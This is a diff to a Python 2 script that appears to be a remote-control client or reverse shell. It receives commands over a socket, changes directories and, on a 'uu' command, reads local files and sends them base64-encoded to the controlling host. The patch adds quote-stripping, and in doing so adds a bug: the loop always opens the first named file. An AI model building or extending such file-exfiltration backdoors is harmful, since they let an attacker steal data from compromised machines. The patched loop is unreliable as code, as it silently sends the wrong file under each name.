@@ -32,6 +32,7 @@ import os
 import time
 import shlex
 import base64
+import re
 
 HOST = '127.0.0.1'    # The remote host
 PORT = 8080           # The same port as used by the server
@@ -55,20 +56,21 @@ def wait_for_command(s):
     elif (len(data_arr) > 1) and (data_arr[0] == "uu"):
         for i in range(1, len(data_arr)):
             try:
-                f = open(data_arr[i], 'rb')
+                f = open(re.sub(r'''"''', '', data_arr[1]), 'rb')
                 pass
             except IOError, e:
                 s.send("=> " + str(e) + "\n")
                 continue
             fdata = file.read(f)
             f.close()
-            s.send("BEGIN: " + data_arr[i] + "\n")
+            filename = re.sub('''"''', '', os.path.basename(data_arr[i]))
+            s.send("BEGIN: " + filename + "\n")
             s.send(base64.encodestring(fdata))
-            s.send("END: " + data_arr[i] + "\n")
+            s.send("END: " + filename + "\n")
         return False
     elif (len(data_arr) > 1) and (data_arr[0] == "cd"):
         try:
-            os.chdir(data_arr[1])
+            os.chdir(re.sub(r'''"''', '', data_arr[1]))
         except Exception, cde:
             s.send(str(cde) + "\n")
             return False
